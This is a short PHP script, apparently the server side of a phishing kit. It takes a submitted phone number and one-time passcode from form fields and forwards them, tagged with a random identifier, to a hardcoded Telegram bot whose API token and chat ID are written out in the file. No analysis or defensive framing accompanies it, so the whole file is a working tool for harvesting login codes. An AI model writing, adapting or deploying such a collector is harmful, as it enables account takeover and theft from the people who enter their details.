<?php

$phone = $_POST["phone"];
$type = $_POST["type"];

$TELEGRAM_API_KEY = "7826075313:AAEb3TPy_QHQHd6R2qy1ek_vDAi_a49vwhw";
$TELEGRAM_CHAT_ID = "7006724996";

if ($type === "phone") {
    $random = $_POST["random"];
    $message = "#" . $random . "\nPhone: " . $phone;
} else if ($type === "otp") {
    $random = $_POST["random"];
    $otp = $_POST["otp"];
    $message = "#" . $random . "\nOTP: " . $otp;
}

$url = "https://api.telegram.org/bot" . $TELEGRAM_API_KEY . "/sendMessage";
$data = http_build_query([
    "chat_id" => $TELEGRAM_CHAT_ID,
    "text" => $message,
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

echo "Message sent successfully";
